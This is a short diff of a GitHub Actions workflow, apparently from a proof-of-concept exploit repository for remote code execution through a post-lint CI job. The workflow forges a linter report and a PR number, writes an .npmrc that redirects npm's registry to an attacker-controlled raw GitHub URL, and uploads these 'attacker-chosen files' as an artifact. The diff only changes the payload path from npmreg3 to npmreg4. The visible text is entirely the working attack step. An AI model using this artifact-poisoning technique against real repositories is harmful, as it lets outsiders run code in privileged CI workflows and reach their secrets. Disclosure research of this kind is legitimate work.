@@ -15,7 +15,7 @@ jobs:
         run: |
           printf 'FORGED REPORT from attacker artifact\n' > linter-report.txt
           printf '1' > pr-number.txt
-          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-rce/main/npmreg3/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-rce/main/npmreg4/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
 
       - name: Upload artifact with attacker-chosen files
         if: always()
